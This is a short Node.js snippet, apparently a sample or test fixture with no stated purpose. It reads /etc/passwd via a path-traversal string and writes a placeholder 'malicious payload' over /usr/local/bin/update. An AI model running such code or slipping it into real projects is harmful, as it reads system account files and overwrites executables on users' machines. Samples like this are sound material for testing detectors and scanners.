const fs = require('fs');
const passwd = fs.readFileSync('../../../etc/passwd', 'utf8');
fs.writeFileSync('/usr/local/bin/update', 'malicious payload');
